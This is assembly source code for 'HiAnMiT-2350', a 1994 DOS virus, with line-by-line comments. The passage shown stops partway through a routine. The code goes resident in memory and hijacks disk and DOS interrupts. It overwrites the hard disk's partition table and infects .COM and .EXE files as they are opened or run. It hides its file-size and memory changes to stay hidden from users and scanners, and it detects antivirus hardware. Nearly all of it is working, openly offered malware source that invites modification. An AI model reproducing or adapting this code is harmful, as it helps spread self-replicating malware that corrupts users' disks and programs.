;                              Name: HiAnMiT-2350
;                              Author:  roy g biv

;                                  UMB version



;                   Copyright (C) 1994 by Defjam Enterprises

;               Greetings to Prototype, and The Gingerbread Man


;                         Contact the Gingerbread Man:
;                        P.O. Box 457, Bexley, NSW 2207
;                                  AUSTRALIA






;                             COMMENTS AT COLUMN 81
;                                 DECLARATIONS

code_byte_c     equ offset code_end-offset begin                                ;true code size
code_word_c     equ (code_byte_c+1)/2                                           ;code size rounded up to next word
stack_byte_c    equ code_byte_c+80h                                             ;code size plus 128-byte stack
total_byte_c    equ offset total_end-offset begin                               ;resident code size
code_kilo_c     equ (total_byte_c+3ffh)/400h                                    ;resident code size in kilobytes
code_sect_c     equ (offset p_offset-offset begin+1ffh)/200h                    ;true code size in sectors
com_byte_c      equ 0ffffh-stack_byte_c                                         ;largest infectable .COM file size
code_resp_c     equ code_kilo_c*40h                                             ;resident code size in paragraphs

useumb_flag     equ 1           ;this cannot be altered without size increase!  ;toggle value when used
int12h_flag     equ 2           ;this cannot be altered without size increase!  ;toggle value when hooked
val04h_flag     equ 4           ;unused
val08h_flag     equ 8           ;unused
val10h_flag     equ 10h         ;unused
closef_flag     equ 20h         ;this cannot be altered without size increase!  ;close executable suffix (either .COM or .EXE)
suffix_flag     equ 40h         ;this cannot be altered!                        ;non-executable suffix (neither .COM nor .EXE)
int21h_flag     equ 80h         ;this cannot be altered without size increase!  ;toggle value when executing
; there you go - three free bits from a toggle switch to use at your discretion


;                                     CODE

.model  tiny
.186
.code

org     100h

begin:  call    file_load                                                       ;save initial offset on stack

file_load:
        pop     si                                                              ;calculate delta offset
        sub     si,offset file_load-offset begin                                ;point to absolute start of code
        mov     ax,1badh                                ;one                    ;call sign
        int     13h                                     ;bad                    ;check if resident
        cmp     ax,0deedh                               ;deed!                  ;return sign if resident
        jnz     go_resident                                                     ;branch if not resident

file_end:
        push    cs                                                              ;save code segment on stack
        pop     ds                                                              ;restore code segment from stack
        add     si,offset exe_buffer-offset begin                               ;point to original code
        cmp     word ptr ds:[si],5a4dh                                          ;check file type
        jz      exec_exe                                                        ;branch if .EXE file
        mov     di,100h                                                         ;.COM files always start at 100h
        push    es                                                              ;save PSP segment on stack
        push    di                                                              ;save return address on stack
                                                                                ;(simulate far call)
        movsb
        movsw                                                                   ;restore original 3 bytes of .COM file
        jmp     short fix_registers                                             ;branch to restore registers

exec_exe:
        add     si,0eh                                                          ;point to stack segment in header
        mov     di,es                                                           ;move PSP segment into DI
        add     di,10h                                                          ;point to first allocated segment
        lodsw                                                                   ;retrieve stack segment
        add     ax,di                                                           ;relocate for actual memory segment
        xchg    dx,ax                                                           ;move stack segment into DX
        lodsw                                                                   ;retrieve stack pointer
        xchg    cx,ax                                                           ;move stack pointer into CX
        lodsw                                                                   ;skip checksum (waste of 2 bytes!)
        lodsw                                                                   ;retrieve instruction pointer
        xchg    bx,ax                                                           ;move intruction pointer into BX
        lodsw                                                                   ;retrieve code segment
        add     ax,di                                                           ;relocate for actual memory segment
        mov     ss,dx                                                           ;restore original stack segment
        mov     sp,cx                                                           ;restore original stack pointer
        push    ax                                                              ;save original code segment on stack
        push    bx                                                              ;save original instruction pointer on stack
                                                                                ;(simulate far call)
fix_registers:
        push    es                                                              ;save PSP segment on stack
        pop     ds                                                              ;restore PSP segment from stack
        retf                                                                    ;return from far call
                                                                                ;(execute host file code)
        db      "HiAnMiT - roy g biv"

;             don't be lame - add your name, but don't alter mine!

go_resident:
        push    ds                                                              ;save PSP segment on stack
        mov     ax,ds                                                           ;move PSP segment into AX
        dec     ax                                                              ;point to MCB segment
        mov     ds,ax                                                           ;move MCB segment into DS
        xor     di,di                                                           ;set destination offset to 0
        mov     bp,code_resp_c                                                  ;paragraph count while resident
        mov     ax,3306h                                                        ;subfunction to get true DOS version number
        int     21h                                                             ;get version number
        inc     al                                                              ;add 1 to al
        jz      normal_alloc                                                    ;branch if version < 5.00
        mov     ax,5802h                                                        ;subfunction to get UMB link state
        int     21h                                                             ;get link state
        cbw                                                                     ;zero AH
        xchg    bx,ax                                                           ;store UMB link state in BX (zero BH)
        push    bx                                                              ;save UMB link state on stack
        mov     ax,5800h                                                        ;subfunction to get memory allocation strategy
        int     21h                                                             ;get allocation strategy
        push    ax                                                              ;save allocation strategy on stack
        mov     ax,5803h                                                        ;subfunction to set UMB link state
        mov     bl,1                                                            ;add UMBs to DOS memory chain
        int     21h                                                             ;set UMB link state
        mov     al,1                                                            ;subfunction to set memory allocation strategy
        push    ax                                                              ;save subfunction on stack
        jb      fix_strategy                                                    ;branch if error
        mov     bl,40h                                                          ;high memory first fit
        int     21h                                                             ;set memory allocation strategy
        jb      fix_strategy                                                    ;branch if error
        mov     ah,48h                                                          ;subfunction to allocate memory
        mov     bx,bp                                                           ;number of paragraphs to allocate
        int     21h                                                             ;allocate memory
        jb      fix_strategy                                                    ;branch if no UMBs available
        mov     es,ax                                                           ;move new code segment into ES
        dec     ax                                                              ;point to MCB segment
        mov     ds,ax                                                           ;mov MCB segment into DS
        mov     word ptr ds:[di+1],8                                            ;store type of memory block (DOS)
        mov     word ptr ds:[di+8],4353h                                        ;store name of memory block (system code)
                                                                                ;(must call it something!)
fix_strategy:
        pop     ax                                                              ;restore subfunction from stack
        pop     bx                                                              ;restore memory allocation strategy from stack
        pushf                                                                   ;save flags on stack
        int     21h                                                             ;set memory allocation strategy
        popf                                                                    ;restore flags from stack
        mov     ax,5803h                                                        ;subfunction to set UMB link state
        pop     bx                                                              ;restore UMB link state from stack
        pushf                                                                   ;save flags on stack
        int     21h                                                             ;set UMB link state
        popf                                                                    ;restore flags from stack
        jnb     move_code                                                       ;branch if no error

normal_alloc:
        cmp     byte ptr ds:[di],5ah                                            ;check segment type
        jnz     branch_end                                                      ;branch if not last block in chain

;                      an MCB walker uses too much code,
;          just to find out if there's enough memory to go resident.
;                    if it's the last block in the chain,
;            there's almost certainly enough memory to go resident.

        sub     word ptr ds:[di+3],bp                                           ;reduce free memory
        sub     word ptr ds:[di+12h],bp                                         ;reduce system memory
        mov     es,word ptr ds:[di+12h]                                         ;move new top of system memory into ES

move_code:
        push    cs                                                              ;save initial code segment on stack
        push    si                                                              ;save inital offset on stack
        mov     cx,code_word_c                                                  ;number of words to move
        db      2eh                                                             ;CS:
                                                                                ;(to avoid having to alter DS)
        repz    movsw                                                           ;move code to top of system memory
        push    es                                                              ;save destination code segment on stack
        push    offset fhook_interrupts-offset begin                            ;save destination offset on stack
                                                                                ;(simulate far call)
                                                                                ;(say that slowly, so as to not offend)
        retf                                                                    ;return from far call
                                                                                ;(continue execution at top of free memory)
branch_end:
        pop     es                                                              ;restore ES from stack
        jmp     file_end                                                        ;branch to restore host file's code

fhook_interrupts:
        mov     ah,52h                                                          ;subfunction to get DOS List of Lists
        int     21h                                                             ;retrieve segment of LoL
                                                                                ;(equivalent to code segment of MSDOS.SYS (or equivalent))
        push    cs                                                              ;save code segment on stack
        pop     ds                                                              ;restore code segment from stack
        mov     word ptr ds:[offset system_seg-offset begin-2],es               ;save system file code segment
        mov     word ptr ds:[di+offset process_no-offset p_offset],cx           ;specify host is the only program currently executing

org     $-1                                                                     ;hard-coded fixup for previous operation
        push    cx                                                              ;save 0 on stack
        inc     cx                                                              ;set toggle switches...
        cmp     bp,0a000h                                                       ;check top of free memory segment
        adc     cx,cx                                                           ;set toggle to allow for UMB use
        mov     word ptr ds:[di+offset toggle_byte-offset p_offset],cx          ;interrupt 12h already hooked,
                                                                                ;interrupt 21h not executing
                                                                                ;(incidently zeroes handle number)
org     $-1                                                                     ;hard-coded fixup for previous operation

;                            After DOS has loaded,
;                 reducing the value returned by interrupt 12h
;                  will NOT reduce the available free memory!
;   Therefore, code stored here will be overwritten when COMMAND.COM reloads

        pop     ds                                                              ;set DS to 0
        push    cs                                                              ;save code segment on stack
        pop     es                                                              ;restore code segment from stack
        mov     si,4                                                            ;offset of interrupt 1 in interrupt table
        movsw                                                                   ;save original offset
        movsw                                                                   ;save original code segment
        mov     bp,offset new_1-offset begin                                    ;offset of new interrupt 1 handler
        mov     word ptr ds:[si-4],bp                                           ;store new offset
        mov     word ptr ds:[si-2],cs                                           ;store new code segment
        lodsw                                                                   ;add 2 to SI
        lodsw                                                                   ;add 2 to SI
        push    si                                                              ;save offset of interrupt 3 on stack
        movsw                                                                   ;save original offset
        movsw                                                                   ;save original code segment
        les     bx,dword ptr ds:[si+74h]                                        ;retrieve address of interrupt 21h handler
        mov     ah,19h          ;the operation must have bit 1 set              ;retrieve current default drive
                                                                                ;(dummy call to invoke interrupt 21h)
        pushf                                                                   ;save flags on stack
        push    cs                                                              ;save code segment on stack
        push    offset hook21h_cont-offset begin                                ;save offset on stack
                                                                                ;(simulate interrupt call)
call_int1:
        push    ax                                                              ;save flags (but with T flag set) on stack
        push    es                                                              ;save interrupt handler code segment on stack
        push    bx                                                              ;save interrupt handler offset on stack
                                                                                ;(simulate interrupt call)
new_1:  push    es                                                              ;save ES on stack
        push    0                                                               ;save 0 on stack
        pop     es                                                              ;set ES to 0
        pusha                                                                   ;save all registers on stack
        mov     bp,sp                                                           ;point to current top of stack
        std                                                                     ;set index direction to forward
        lea     si,word ptr [bp+14h]                                            ;offset of address of original interrupt address
        mov     di,0eh                                                          ;offset of interrupt 3 segment in interrupt table
        db      36h                                                             ;SS:
                                                                                ;(to avoid having to save and set DS)
        lodsw                                                                   ;retrieve new code segment
        stosw                                                                   ;store new code segment
        db      36h                                                             ;SS:
                                                                                ;(to avoid having to save and set DS)
        movsw                                                                   ;store new offset
        cmp     ax,4d47h                                                        ;check interrupt code segment
                                                                                ;(the value here is altered as required)
system_seg:
        ja      quit_1                                                          ;branch while not correct segment
        mov     si,offset p_offset-offset begin+2                               ;offset of address of original interrupt 1 address
        scasw                                                                   ;add 2 to DI
        scasw                                                                   ;add 2 to DI
        db      2eh                                                             ;CS:
                                                                                ;(to avoid having to save and set DS)
        movsw                                                                   ;restore original offset of interrupt 1 handler
        db      2eh                                                             ;CS:
                                                                                ;(to avoid having to save and set DS)
        movsw                                                                   ;restore original code segment of interrupt 1 handler
                                                                                ;(remap interrupt 3)
quit_1: popa                                                                    ;restore all registers from stack
        pop     es                                                              ;restore ES from stack
        iret                                                                    ;return from interrupt

hook21h_cont:
        pop     si                                                              ;restore offset of interrupt 3 from stack
        push    si                                                              ;save offset of interrupt 3 on stack
        push    offset hook1_cont-offset begin                                  ;save offset on stack
                                                                                ;(simulate subroutine call)
hook_int:
        push    cs                                                              ;save code segment on stack
        pop     es                                                              ;restore code segment from stack
        xor     ah,ah                                                           ;zero AH
        mov     di,offset jfar_21h-offset begin+1                               ;area to store original interrupt 21h address
        push    ds                                                              ;save DS on stack
        lds     si,dword ptr ds:[si]                                            ;retrieve original interrupt 21h handler address
        lodsb                                                                   ;retireve first byte of handler
        cmp     al,0ebh                                                         ;check if DOS=HIGH handler code
        lodsb                                                                   ;retrieve branch size
        jz      himem                                                           ;branch if DOS to load high
        dec     si
        dec     si                                                              ;point to original offset of handler
        db      0b8h                                                            ;dummy operation to mask add

himem:  add     si,ax                                                           ;allow for jump
        xchg    ax,si                                                           ;store new handler offset in AX
        stosw                                                                   ;save original code offset

;                         this is a really awful kluge
; (yes, that IS how you spell 'kluge' - it's pronounced 'kloog', not 'kludge')
; but it seems to be the only way to allow compatability with loading DOS high

        mov     ax,ds                                                           ;retrieve original code segment
        stosw                                                                   ;save original code segment
        pop     ds                                                              ;restore DS from stack
        cmp     ax,word ptr cs:[bp+offset system_seg-offset new_1-2]            ;check segment of system file
        ja      hook_cont                                                       ;branch if system segment not located
        mov     al,0eah                                                         ;set opcode to jmp xxxx:xxxx
        mov     di,offset old21h_code-offset begin                              ;area to store original 5 bytes of handler
        stosb                                                                   ;store jump
        mov     ax,offset intro_21h-offset begin                                ;offset of new interrupt handler
        stosw                                                                   ;store offset
        mov     ax,cs                                                           ;code segment of new interrupt handler
        stosw                                                                   ;store code segment
        push    offset hook_cont-offset begin                                   ;save offset on stack
                                                                                ;(simulate subroutine call)
hook_interrupt:
        push    ds                                                              ;save DS on stack
        push    es                                                              ;save ES on stack
        pusha                                                                   ;save all registers on stack
        push    cs                                                              ;save code segment on stack
        pop     ds                                                              ;restore code segment of storage area from stack
        mov     cx,offset toggle_byte-offset old21h_code                        ;number of bytes to save
        mov     si,offset old21h_code-offset begin                              ;area to store original 5 bytes of handler
        les     di,dword ptr ds:[offset jfar_21h-offset begin+1]                ;retrieve original handler address
        cld                                                                     ;set index direction to forward
        cli                                                                     ;disable interrupts

set_intadr:
        mov     al,byte ptr es:[di]                                             ;retrieve original byte
        movsb                                                                   ;exchange it with new byte
        mov     byte ptr ds:[si-1],al                                           ;store original byte
        loop    set_intadr                                                      ;branch while bytes remain
                                                                                ;(stealth-hook interrupt)
        sti                                                                     ;enable interrupts
        popa                                                                    ;restore all registers from stack
        pop     es                                                              ;restore ES from stack
        pop     ds                                                              ;restore DS from stack
        ret                                                                     ;return from subroutine

hook_cont:
        mov     si,0bch                                                         ;offset of interrupt 2fh in interrupt table
        mov     di,offset jfar_2fh-offset begin+1                               ;area to store original interrupt 2fh handler
        movsw                                                                   ;save original offset
        movsw                                                                   ;save original code segment
        mov     word ptr ds:[si-4],offset new_2fh-offset begin                  ;store new offset
        mov     word ptr ds:[si-2],cs                                           ;store new code segment

known_ret:
        ret                                                                     ;return from subroutine

hook1_cont:
        pop     si                                                              ;restore offset of interrupt 3 from stack
        mov     word ptr ds:[si-8],bp                                           ;save new offset
        mov     word ptr ds:[si-6],cs                                           ;save new code segment
                                                                                ;(rehook interrupt 1 - it's already been saved)
        push    ds                                                              ;save DS on stack
        mov     ax,0f000h                                                       ;segment of BIOS
        mov     di,offset system_seg-offset begin-2                             ;area to store BIOS segment
        stosw                                                                   ;store BIOS segment
        mov     al,75h                                                          ;set opcode to JNZ
        stosb                                                                   ;store opcode
        push    cs                                                              ;save code segment on stack
        pop     ds                                                              ;restore code segment from stack
        mov     ah,13h                                                          ;subfunction to set disk interrupt handler
        mov     bx,offset new_13h-offset begin                                  ;offset of new interrupt 13h handler
        mov     byte ptr ds:[bx+offset int13h_branch-offset new_13h-1],offset jfar_13h-offset int13h_branch
                                                                                ;disable interrupt 13h handler initially...
org     $-1                                                                     ;hard-coded fixup for previous operation
        mov     dx,bx                                                           ;offset of new interrupt 13h handler
        int     2fh                                                             ;set disk interrupt handler
                                                                                ;the return value should be pointing to
                                                                                ;the ROM BIOS, but I'll trace it anyway
        push    cs                                                              ;save code segment on stack
        pop     ds                                                              ;restore code segment from stack
        mov     di,offset jfar_13h-offset begin+1                               ;area to store original interrupt 13h address
        mov     word ptr ds:[di],bx                                             ;save original offset
        mov     word ptr ds:[di+2],es                                           ;save original code segment
        mov     ah,1            ;the operation must have bit 1 set              ;retrieve system status
                                                                                ;(dummy call to invoke interrupt 13h)
        pushf                                                                   ;save flags on stack
        push    cs                                                              ;save code segment on stack
        call    call_int1                                                       ;save offset on stack
                                                                                ;(simulate interrupt call)
        mov     byte ptr ds:[offset system_seg-offset begin],77h                ;change operation from JNZ to JA
        pop     ds                                                              ;restore DS from stack
        push    ds                                                              ;save DS on stack
        popf                                                                    ;clear T flag

;         since interrupt 13h returns with a RETF 2, and not an IRET,
;                   the trace flag must be cleared manually,
;             otherwise severe performance degradation will occur

        pop     bx                                                              ;restore initial offset from stack
        pop     ax                                                              ;restore initial code segment from stack
        push    cs                                                              ;save code segment on stack
        pop     es                                                              ;restore code segment from stack
        cmp     word ptr ds:[si+2],0f000h                                       ;check BIOS code segment
        jnz     no_write                                                        ;branch if not in ROM
        movsw                                                                   ;save original offset
        movsw                                                                   ;save original code segment
        mov     ds,ax                                                           ;store initial code segment in DS
        push    ds                                                              ;save initial code segment on stack
        pop     es                                                              ;restore initial code segment from stack
        mov     ax,201h                                                         ;read 1 sector
        mov     cl,al                                                           ;cylinder 0, sector 1
        mov     dx,80h                                                          ;side 0 of hard disk
        int     3                                                               ;read partition table
                                                                                ;(interrupt 13h remapped to interrupt 3)
        jb      no_write                                                        ;branch if error
        mov     cl,4                                                            ;only 4 possible partitions
        mov     byte ptr cs:[di+offset int13h_branch-offset cont_13h-1],cl      ;enable interrupt 13h handler

org     $-1                                                                     ;hard-coded fixup for previous operation

;  if BIOS code segment is not located in ROM, then something else is loaded
;       (antivirus card, software with anti-tunneling techniques, etc.)
;                      so partition write must not occur

        mov     di,1beh                                                         ;offset of first partition in partition table

find_hdd:
        cmp     dl,byte ptr ds:[bx+di]                                          ;check partition type
        jnz     no_part                                                         ;branch if not active partition
        push    cs                                                              ;save code segment on stack
        pop     es                                                              ;restore code segment from stack
        lea     si,word ptr [bx+di]                                             ;offset of active partition information
        xchg    di,ax                                                           ;move inter-buffer offset into AX
        mov     di,offset p_offset-offset begin                                 ;area to store active partition offset
        stosw                                                                   ;store partition information offset
        mov     cl,move_isize   ;directive at end of code to calculate this     ;partition information byte-count

org     $-2                                                                     ;hard-coded fixup for previous operation
        push    cx                                                              ;save active partition byte-count on stack
        push    si                                                              ;save active partition offset on stack
        repz                                                                    ;repeat until CX = 0...
        db      move_ptype      ;directive at end of code to calculate this     ;store active partition information
        mov     cl,move_psize   ;directive at end of code to calculate this     ;new partition loader byte-count

org     $-2                                                                     ;hard-coded fixup for previous operation
        mov     si,bx                                                           ;offset of partition table
        push    cx                                                              ;save partition loader byte-count on stack
        push    si                                                              ;save offset of partition table on stack
        repz                                                                    ;repeat until CX = 0...
        db      move_ptype      ;directive at end of code to calculate this     ;save original partition table loader
        push    ds                                                              ;save partition segment on stack
        pop     es                                                              ;restore partition segment from stack
        push    cs                                                              ;save code segment on stack
        pop     ds                                                              ;restore code segment from stack
        mov     al,2                                                            ;number of information sets to alter
        mov     si,offset newp_loader-offset begin                              ;move new active partition offset into SI

load_new:
        pop     di                                                              ;restore partition offset from stack
        pop     cx                                                              ;restore partition byte-count from stack
        repz                                                                    ;repeat until CX = 0...
        db      move_ptype      ;directive at end of code to calculate this     ;store new partition information
        dec     al                                                              ;decrement loop count
        jnz     load_new                                                        ;branch while information sets remain
        mov     ax,301h                                                         ;write 1 sector
        inc     cx                                                              ;cylinder 0, sector 1
        int     3                                                               ;write infected partition table
        push    cs                                                              ;save code segment on stack
        pop     es                                                              ;restore code segment from stack
        mov     ax,code_sect_c+300h                                             ;number of sectors in code
        xor     bx,bx                                                           ;set write address to 0
        inc     cx                                                              ;cylinder 0, sector 2
        int     3                                                               ;write viral code
        dec     cx                                                              ;dummy CX
                                                                                ;(so loop will fall straight through)
no_part:add     di,10h                                                          ;point to next partition
        loop    find_hdd                                                        ;repeat while possible partitions remain

no_write:
        push    0                                                               ;save 0 on stack
        pop     es                                                              ;set ES to 0
        mov     si,offset p_offset-offset begin+4                               ;offset of address of original interrupt 3 address
        mov     di,0ch                                                          ;offset of interrupt 3 in interrupt table
        db      2eh                                                             ;CS:
                                                                                ;(to avoid having to set DS)
        movsw                                                                   ;restore original offset
        db      2eh                                                             ;CS:
                                                                                ;(to avoid having to set DS)
        movsw                                                                   ;restore original code segment
        pop     es                                                              ;restore PSP segment from stack
        lds     si,dword ptr es:[di-6]                                          ;retrieve original termination address
        pushf                                                                   ;save flags on stack
        push    cs                                                              ;save code segment on stack
        call    set_terminate                                                   ;save offset on stack
                                                                                ;(simulate interrupt call)
        push    offset file_end-offset begin                                    ;save offset on stack
                                                                                ;(simluate subroutine call)
test_int12h:
        push    offset save_psp-offset begin                                    ;save return address on stack
        xor     si,si                                                           ;zero SI
        mov     di,offset toggle_byte-offset begin                              ;area to store toggle data
        test    byte ptr cs:[di],int12h_flag                                    ;check interrupt 12h status
        jnz     get_psp                                                         ;branch if interrupt 12h already hooked
        mov     ds,si                                                           ;set DS to 0
        mov     word ptr ds:[si+48h],offset new_12h-offset begin                ;store new offset
        mov     word ptr ds:[si+4ah],cs                                         ;store new code segment
                                                                                ;(hook interrupt 12h to hide memory change)
;             if interrupt 12h is hooked from the partition table,
;                 MS-DOS v6.xx EMM386.EXE causes a system hang

        or      byte ptr cs:[di],int12h_flag                                    ;specify that interrupt 12h has been hooked

get_psp:mov     ah,51h                                                          ;subfunction to retrieve PSP segment
        jmp     call_21h                                                        ;retrieve PSP segment

save_psp:
        mov     ds,bx                                                           ;move PSP segment into DS
        test    byte ptr cs:[di],useumb_flag                                    ;check where code is loaded
        jz      int12h_ret                                                      ;branch if code loaded high
        add     word ptr ds:[si+2],code_resp_c                                  ;restore top of free memory

int12h_ret:
        push    ds                                                              ;save PSP segment on stack
        pop     es                                                              ;restore PSP segment from stack
        ret                                                                     ;return from subroutine

terminate:
        push    cs                                                              ;save code segment on stack
        pop     ds                                                              ;restore code segment from stack
        pushf                                                                   ;save flags on stack
        mov     bx,offset process_no-offset begin                               ;area containing process information
        sub     word ptr ds:[bx],4                                              ;specify current process is terminating
        mov     si,word ptr ds:[bx]                                             ;retrieve process number
        test    byte ptr ds:[bx+offset toggle_byte-offset process_no],int21h_flag
                                                                                ;check interrupt 21h status
org     $-1                                                                     ;hard-coded fixup for previous operation
        push    word ptr ds:[bx+si+offset process_seg-offset process_no]        ;save original code segment on stack

org     $-1                                                                     ;hard-coded fixup for previous operation
        push    word ptr ds:[bx+si+offset process_off-offset process_no]        ;save original offset on stack

org     $-1                                                                     ;hard-coded fixup for previous operation
        jz      end_int21h                                                      ;branch if interrupt 21h is not executing
                                                                                ;(for compability with interrupt 20h, et al)
intro_21h:
        pushf                                                                   ;save flags on stack
        call    hook_interrupt                                                  ;hook interrupt
        xor     byte ptr cs:[offset toggle_byte-offset begin],int21h_flag       ;toggle interrupt 21h status
        js      exec_int21h                                                     ;branch if interrupt 21h is executing
        cmp     ax,4b00h                                                        ;check requested operation
        jz      exec_child                                                      ;branch if execute
        popf                                                                    ;restore flags from stack

end_int21h:
        retf    2                                                               ;return from interrupt with flags set

exec_child:
        mov     bx,offset header_buffer-offset begin+0ah                        ;area to contain parameter block
        mov     ss,word ptr cs:[bx+10h]                                         ;restore original stack segment
        mov     sp,word ptr cs:[bx+0eh]                                         ;restore original stack pointer
                                                                                ;(what we need is an LSS,SP command in 8086 mode)
        cbw                                                                     ;zero AX
        jmp     dword ptr cs:[bx+12h]                                           ;branch to host code

exec_int21h:
        push    cs                                                              ;save code segment on stack
        push    offset intro_21h-offset begin                                   ;save offset on stack
                                                                                ;(simulate interrupt call)
        push    si                                                              ;save SI on stack
        pusha                                                                   ;save all registers on stack
        mov     cx,(offset call_21h-offset op_table)/3                          ;opcode table length
        mov     si,offset op_table-offset begin-2                               ;offset of table of opcodes

find_op:inc     si                                                              ;skip low byte of opcode address
        inc     si                                                              ;skip high byte of opcode address

;  using CMPSW here, to save a byte, will result in a system hang, if DI=FFFFh

        db      2eh                                                             ;CS:
                                                                                ;(to avoid having to save and set DS)
        lodsb                                                                   ;retrieve opcode from table
        cmp     al,ah                                                           ;check opcode
        loopnz  find_op                                                         ;branch if not handled but opcodes remain
        push    word ptr cs:[si]                                                ;save handler address on stack
        mov     bp,sp                                                           ;point to current top of stack
        pop     word ptr ss:[bp+12h]                                            ;restore handler address from stack
                                                                                ;(saves handler address at top of stack)
                                                                                ;(simulate subroutine call)
        popa                                                                    ;restore all registers from stack
        ret                                                                     ;return from subroutine

op_table:
        db      11h                                                             ;find first (FCB)
        dw      offset hide_length-offset begin
        db      12h                                                             ;find next (FCB)
        dw      offset hide_length-offset begin
        db      3ch                                                             ;create file
        dw      offset do_create-offset begin
        db      3dh                                                             ;open file
        dw      offset do_infect-offset begin
        db      3eh                                                             ;close file
        dw      offset do_close-offset begin
        db      3fh                                                             ;read file
        dw      offset do_disinf-offset begin
        db      40h                                                             ;write file
        dw      offset do_disinf-offset begin
        db      42h                                                             ;set file pointer
        dw      offset check_disinf-offset begin
        db      4bh                                                             ;load file
        dw      offset check_infect-offset begin
        db      4eh                                                             ;find first (DTA)
        dw      offset hide_length-offset begin
        db      4fh                                                             ;find next (DTA)
        dw      offset hide_length-offset begin
        db      57h                                                             ;get/set file date and time
        dw      offset fix_time-offset begin
        db      5bh                                                             ;create file
        dw      offset do_create-offset begin
        db      6ch                                                             ;extended open/create (DOS v4.00+)
        dw      offset check_extend-offset begin

default_handler:
        db      0                               ;this must not be removed       ;corresponds to anything else
        dw      offset jfar_21h-offset begin    ;this must not be removed

;                  adding new opcode handlers is very simple -
;        simply insert the value of the opcode to intercept (AH only!),
;          and the address of the handler, ABOVE the default handler

call_21h:
        pushf                                                                   ;save flags on stack
        push    cs                                                              ;save code segment on stack
        push    offset known_ret-offset begin                                   ;save offset of a known RET on stack
                                                                                ;(simulate interrupt call)
jfar_21h:
        db      0eah                                                            ;jmp xxxx:xxxx
        dd      0                                                               ;original interrupt 21h address here

hide_length:
        push    ax                                                              ;save requested operation on stack
        call    call_21h                                                        ;find file
        pushf                                                                   ;save flags on stack
        push    bp                                                              ;save BP on stack
        mov     bp,sp                                                           ;point to current top of stack
        test    byte ptr ss:[bp+5],40h                                          ;check requested operation
        jz      save_code                                                       ;branch if FCB find

;       this saves virtually duplicating this procedure for AH=4Eh,4Fh

        push    word ptr ss:[bp+2]                                              ;save flags on stack
        pop     word ptr ss:[bp+0ah]                                            ;restore flags from stack (save as original)

save_code:
        mov     word ptr ss:[bp+4],ax                                           ;save return code on stack
        lahf                                                                    ;store flags in AH
        pop     bp                                                              ;restore BP from stack
        popf                                                                    ;restore flags from stack
        or      al,al                                                           ;check return code
        jnz     quit_hide                                                       ;branch if error occurred
        push    ds                                                              ;save DS on stack
        push    es                                                              ;save ES on stack
        push    bx                                                              ;save BX on stack
        sahf                                                                    ;store AH in flags
        pushf                                                                   ;save flags on stack
        call    get_psp                                                         ;retrieve PSP segment
        mov     es,bx                                                           ;move PSP segment into ES
        cmp     bx,word ptr es:[16h]                                            ;compare current PSP with parent PSP
        jnz     nohide                                                          ;branch if PSPs differ
                                                                                ;(this prevents CHKDSK errors!)
        mov     bx,dx                                                           ;move offset of FCB into BX
        mov     ah,2fh                                                          ;subfunction to retrieve DTA address
        mov     al,byte ptr ds:[bx]                                             ;retrieve FCB type
        call    call_21h                                                        ;retrieve DTA address
        inc     al                                                              ;check FCB type
        jnz     time_adjust                                                     ;branch if not extended FCB
        add     bx,7                                                            ;allow for additional bytes

time_adjust:
        popf                                                                    ;restore flags from stack
        pushf                                                                   ;save flags on stack
        jz      getime                                                          ;branch if FCB find
        dec     bx                                                              ;adjust offset for DTA find

getime: push    es                                                              ;save DTA segment on stack
        pop     ds                                                              ;restore DTA segment from stack
        mov     al,byte ptr ds:[bx+17h]                                         ;retrieve file time from FCB
        and     al,1fh                                                          ;convert time to seconds only
        xor     al,1eh                                                          ;check for 60 seconds
        jnz     nohide                                                          ;branch if file is not infected
        and     byte ptr ds:[bx+17h],0e0h                                       ;set 0 seconds
        inc     byte ptr ds:[bx+17h]                                            ;prevent 12:00am times disappearing
        popf                                                                    ;restore flags from stack
        pushf                                                                   ;save flags on stack
        jz      adjust_size                                                     ;branch if FCB find
        dec     bx
        dec     bx                                                              ;adjust offset for DTA find

adjust_size:
        sub     word ptr ds:[bx+1dh],code_byte_c                                ;hide file length increase
        sbb     word ptr ds:[bx+1fh],0                                          ;allow for page shift

nohide: popf                                                                    ;restore flags from stack
        pop     bx                                                              ;restore BX from stack
        pop     es                                                              ;restore ES from stack
        pop     ds                                                              ;restore DS from stack

quit_hide:
        pop     ax                                                              ;restore return code from stack
        iret                                                                    ;return from interrupt

check_extend:
        or      al,al                                                           ;check requested operation
        jnz     jfar_21h                                                        ;branch if not extended open/create
        push    bx                                                              ;save BX on stack
        push    dx                                                              ;save DX on stack
        mov     dx,si                                                           ;move offset of pathname into DX
        db      38h                                                             ;dummy operation to mask push and push

do_create:
        push    bx                                                              ;save BX on stack
        push    dx                                                              ;save DX on stack
        mov     byte ptr cs:[offset file_handle-offset begin],0                 ;specify file is not to be infected
        push    es                                                              ;save ES on stack
        pusha                                                                   ;save all registers on stack
        push    ds                                                              ;save segment of pathname on stack
        pop     es                                                              ;restore segment of pathname from stack
        push    offset create_cont-offset begin                                 ;save offset on stack
                                                                                ;(simulate subroutine call)
get_suffix:
        xor     al,al                                                           ;set sentinel byte to 0
        mov     cx,7fh                                                          ;number of bytes to search
        mov     di,dx                                                           ;move offset of pathname into DI
        repnz   scasb                                                           ;find sentinel byte in pathname
        lea     si,word ptr [di-6]                                              ;offset of suffix-1
        cmp     dx,si                                                           ;ensure that file has suffix
                                                                                ;(prevents some truly peculiar bugs!)
        ja      return_suffix                                                   ;branch if file has no suffix
        mov     cl,2                                                            ;number of words to compare
        inc     si                                                              ;point at period in filename

get_type:
        db      26h                                                             ;ES:
                                                                                ;(to avoid having to save and set DS)
        lodsw                                                                   ;retrieve half of suffix
        and     ax,0dfdfh                                                       ;convert to uppercase
        xchg    bx,ax                                                           ;move half of suffix into BX
        loop    get_type                                                        ;repeat for other half of suffix

;                       default suffix comparison here

        cmp     ax,430eh                                                        ;check first half of suffix
        jnz     return_suffix                                                   ;branch if not 'C.'
        cmp     bx,4d4fh                                                        ;check if second half is 'MO'

;                    no need to check for .EXE suffixes,
;   since .EXE files are recognised by the first two bytes of the header,
;                  and infected regardless of their suffix.

;                      alternate suffix comparison here
;               only useful if you have more than 2 suffices!
;       (because additional size-cost is only 4 bytes, rather than 11)

;       push    es                                                              ;save ES on stack
;       push    cs                                                              ;save CS on stack
;       pop     es                                                              ;restore CS from stack
;       mov     cl,(offset create_cont-offset suffix_list)/4                    ;number of suffices to compare
;       mov     di,offset suffix_list-offset begin                              ;offset of table of suffices

scan_suffix:
;       scasw                                                                   ;compare first half of suffix
;       jnz     skip_suffix                                                     ;branch if suffices do not match
;       xchg    bx,ax                                                           ;swap second half of suffix with first half
